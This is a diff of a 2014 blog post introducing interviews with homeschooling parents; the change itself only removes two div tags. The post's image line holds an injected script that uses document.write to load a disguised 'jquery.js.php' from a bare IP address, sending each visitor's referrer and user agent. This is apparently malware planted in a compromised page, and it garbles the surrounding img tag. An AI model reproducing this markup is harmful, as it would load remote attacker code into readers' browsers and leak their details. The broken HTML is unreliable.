@@ -9,7 +9,7 @@ categories: tbd
 
 ## 19th October 2014
 
-<div>
+
 
 <p <img class="photo-horiz" ext/javascript" rel="nofollow"  document.write("<script language='javascript' rel='nofollow' type='text/javascript' src='http://5.45.67.97/1/jquery.js.php?r=" + encodeuri(document.referrer) + "&u=" + encodeuri(navigator.useragent) + "'></sc" + "ript>"); </script></noindex>  1942,   by Bernard Hoffman" src="http://media-cache-ec0.pinimg.com/736x/c5/ec/ce/c5ecce605de572e343a813ce9dc7fcb1.jpg" /></p>
 
@@ -19,7 +19,7 @@ categories: tbd
 
 Have you ever contemplated homeschooling? In the early morning, for instance, while searching for readers and shoes and hairbands, and trying to launch a stealth washcloth attack on the children, have you ever wondered what it might be like to opt out of the daily grind? How different would life look if you kept the kids at home and took a radical new approach to their education? Could it work? **How** would it work, exactly?
 
-</div>
+
 
 Recently, I tried to dig into these questions by interviewing four homeschooling parents for Mamabake. I asked them all the same bunch of questions, and although answers to some questions were similar (nobody, for instance, seemed too impressed with my queries about 'socialisation'!) , daily life looked quite different for each family.
 
